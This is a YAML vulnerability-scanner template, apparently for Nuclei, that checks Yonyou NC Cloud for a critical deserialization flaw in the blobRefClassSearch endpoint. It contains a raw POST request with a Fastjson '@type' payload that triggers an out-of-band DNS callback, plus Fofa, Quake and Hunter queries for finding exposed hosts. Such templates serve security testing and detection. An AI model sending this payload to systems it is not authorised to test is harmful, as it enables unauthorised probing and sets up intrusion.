id: Yonyou_NC_cloud_blobRefClassSearch_Deserialization

info:
  name: Yonyou_NC_cloud_blobRefClassSearch_Deserialization
  author: HK
  severity: critical
  description: 用友NC Cloud大型企业数字化平台/ncchr/pm/ref/indiIssued/blobRefClassSearch接口val参数存在反序列化漏洞。
  metadata:
    max-request: 1
    Fofa-query: body="/public/img/picture.ico"
    Quake-query: body="/public/img/picture.ico"
    Hunter-query: body="/public/img/picture.ico"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
    Content-Type: application/json
    Host: {{Hostname}}
    Connection: close
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Content-Length: 116

    {"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{interactsh-url}}\"}}}"}

  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: word
        words:
          - "dns"
        part: interactsh_protocol